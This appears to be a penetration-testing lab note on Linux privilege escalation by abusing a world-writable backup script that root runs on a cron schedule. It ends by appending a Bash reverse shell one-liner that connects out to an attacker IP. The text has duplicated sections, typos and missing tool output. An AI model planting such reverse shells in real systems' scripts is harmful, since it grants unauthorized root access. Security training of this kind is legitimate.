## Table of Contents

  - [Table of Contents](#Table\of\Contents)
  - [Table of Contents](#Table\of\Contents)
- [Cron Job Abuse](#cron\job\abuse)

## Table of Contents

  - [Table of Contents](#Table\of\Contents)
- [Cron Job Abuse](#cron\job\abuse)

## Table of Contents

- [Cron Job Abuse](#cron\job\abuse)

# Cron Job Abuse
Cron jobs are scripts/functions that are to be called on a particular schedule. the `crontab` command can create a cron file, which will be run by the `cron daemon` on the schedule specified. When created, the cron file will be created in `/var/spool/cron` for the specific user that creates it. Each entry in the crontab file requires six items in the following order:
- Minutes, Hours, Days, Months, Weeks, Commands.
- Ex:
`0 */12 * * * /home/admin/backup.sh` would run every 12 hours


The root crontab is almost always only editable by the root user or a user with full sudo privileges; howver this can still be abused. It's possible to find a world-writable script that runs as root and, even if you cannt read the crontab to know the exact schedule, you be may able to ascertain how often it runs (i.e., backup script that createes `.tar.gz` file every 12 hours. )

- Certain applications create cron files in the `/etc/cron.d` directory and may be misconfigured to allow a non-root user to edit them.

First, let's look around the system for any writeable files or directories.
```bash
find / -path -prune -o -type f -perm -o+w 2>/dev/null
```

A quick look in the `/dmz/backups` directory shows what appears to be files created every three minutes. This seems to be a major misconfiguration. Perhaps the sysadmin meant to specify every three hours like `0 */3 * * *` but instead wrote: `*/3 * * * *`, which tells the cron job to run every three minutes. The second issue is that the `backup.sh` is world writeable and runs as root.
```bash
ls -la /dmz-backups/

total 36
drwxrwxrwx  2 root root 4096 Aug 31 02:39 .
drwxr-xr-x 24 root root 4096 Aug 31 02:24 ..
-rwxrwxrwx  1 root root  230 Aug 31 02:39 backup.sh
```

We can confirm that a cron job is running using [pspy](https://github.com/DominicBreuker/pspy), a command-line tool used to view running processes without the need for root privileges. We can use it to see commands run by other users, cron jobs, etc. It works by scanning [procfs](https://en.wikipedia.org/wiki/Procfs).

We can confirm that a cron job is running using [pspy](https://github.com/DominicBreuker/pspy), a command-line tool used to view running processes without the need for root privileges. We can use it to see commands run by other users, cron jobs, etc. It works by scanning [procfs](https://en.wikipedia.org/wiki/Procfs).

Let's run `pspy` and have a look. The `-pf` flag tells the tool to print commands and file system events and `-i 1000` tells it to scan [profcs](https://man7.org/linux/man-pages/man5/procfs.5.html) every 1000ms (or every second).

```shell-session
gdxqpardo@htb[/htb]$ ./pspy64 -pf -i 1000
```


From the above output, we can see that a cron job runs the `backup.sh` script located in the `/dmz-backups` directory and creating a tarball file of the contents of the `/var/www/html` directory.


We can look at the shell script and append a command to it to attempt to obtain a reverse shell as root. If editing a script, make sure to `ALWAYS` take a copy of the script and/or create a backup of it. We should also attempt to append our commands to the end of the script to still run properly before executing our reverse shell command.

```shell-session
gdxqpardo@htb[/htb]$ cat /dmz-backups/backup.sh 

#!/bin/bash
 SRCDIR="/var/www/html"
 DESTDIR="/dmz-backups/"
 FILENAME=www-backup-$(date +%-Y%-m%-d)-$(date +%-T).tgz
 tar --absolute-names --create --gzip --file=$DESTDIR$FILENAME $SRCDIR
```

We can see that the script is just taking in a source and destination directory as variables. It then specifies a file name with the current date and time of backup and creates a tarball of the source directory, the web root directory. Let's modify the script to add a [Bash one-liner reverse shell](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet).

Code: bash

```bash
#!/bin/bash
SRCDIR="/var/www/html"
DESTDIR="/dmz-backups/"
FILENAME=www-backup-$(date +%-Y%-m%-d)-$(date +%-T).tgz
tar --absolute-names --create --gzip --file=$DESTDIR$FILENAME $SRCDIR
 
bash -i >& /dev/tcp/10.10.14.3/443 0>&1
```





